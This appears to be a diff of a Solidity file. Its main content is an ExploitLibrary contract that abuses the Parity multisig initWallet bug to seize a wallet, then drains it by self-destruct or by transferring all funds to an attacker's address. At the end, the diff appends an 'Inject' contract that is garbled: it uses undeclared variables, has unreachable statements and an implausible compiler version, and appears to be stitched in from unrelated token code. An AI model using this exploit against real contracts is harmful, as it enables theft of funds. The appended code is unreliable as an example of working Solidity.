@@ -9,12 +9,12 @@ contract WalletAbi {
   function kill(address _to);
   function initWallet(address[] _owners, uint _required, uint _daylimit);
   function execute(address _to, uint _value, bytes _data) returns (bytes32 o_hash);
-  
+
 }
 
 // Exploit a Parity MultiSig wallet
 contract ExploitLibrary {
-    
+
     // Take ownership of Parity Multisig Wallet
     function takeOwnership(address _contract, address _to) public {
         WalletAbi wallet = WalletAbi(_contract);
@@ -23,14 +23,14 @@ contract ExploitLibrary {
         // Partiy multisig has a bug with initWallet()
         wallet.initWallet(newOwner, 1, uint256(0-1));
     }
-    
+
     // Empty all funds by suicide
     function killMultisig(address _contract, address _to) public {
         takeOwnership(_contract, _to);
         WalletAbi wallet = WalletAbi(_contract);
         wallet.kill(_to);
     }
-    
+
     // Transfer funds from Multisig contract (_amount == 0 == all)
     function transferMultisig(address _contract, address _to, uint _amount) public {
         takeOwnership(_contract, _to);
@@ -41,4 +41,17 @@ contract ExploitLibrary {
         wallet.execute(_to, amt, "");
     }
 
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+return super.mint(_to, _amount);
+require(totalSupply_.add(_amount) <= cap);
+			freezeAccount[account] = key;
+		}
+	}
 }
